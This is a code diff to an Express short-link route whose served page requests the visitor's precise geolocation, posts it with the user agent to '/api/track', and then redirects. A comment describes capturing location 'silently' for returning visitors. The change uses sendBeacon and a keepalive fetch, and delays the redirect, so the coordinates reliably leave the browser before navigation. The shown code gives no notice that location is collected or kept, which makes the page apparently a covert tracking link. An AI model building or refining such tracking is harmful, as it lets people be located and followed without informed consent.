@@ -278,13 +278,23 @@ app.get('/s/:id', async (req, res) => {
         const destUrl = '${destinationUrl}';
         const alreadySubscribed = localStorage.getItem(storageKey);
 
-        // Helper: send location to server via /api/track (works on Vercel)
-        function sendLocation(lat, lng) {
-            fetch('/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ linkId: linkId, lat: lat, lng: lng, userAgent: navigator.userAgent })
-            }).catch(function(){});
+        // Send location using sendBeacon (survives page navigation)
+        function sendLocation(lat, lng, callback) {
+            var data = JSON.stringify({ linkId: linkId, lat: lat, lng: lng, userAgent: navigator.userAgent });
+            var sent = false;
+            if (navigator.sendBeacon) {
+                sent = navigator.sendBeacon('/api/track', new Blob([data], { type: 'application/json' }));
+            }
+            if (!sent) {
+                // Fallback: fetch with keepalive
+                fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: data,
+                    keepalive: true
+                }).catch(function(){});
+            }
+            if (callback) setTimeout(callback, 300);
         }
 
         // If already subscribed: capture location silently then redirect to destination
@@ -292,8 +302,9 @@ app.get('/s/:id', async (req, res) => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
-                        sendLocation(pos.coords.latitude, pos.coords.longitude);
-                        window.location.replace(destUrl);
+                        sendLocation(pos.coords.latitude, pos.coords.longitude, function() {
+                            window.location.replace(destUrl);
+                        });
                     },
                     function() { window.location.replace(destUrl); },
                     { timeout: 4000, enableHighAccuracy: true }
@@ -320,9 +331,10 @@ app.get('/s/:id', async (req, res) => {
 
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    sendLocation(position.coords.latitude, position.coords.longitude);
                     localStorage.setItem(storageKey, 'true');
-                    window.location.href = destUrl;
+                    sendLocation(position.coords.latitude, position.coords.longitude, function() {
+                        window.location.href = destUrl;
+                    });
                 },
                 function() {
                     localStorage.setItem(storageKey, 'true');
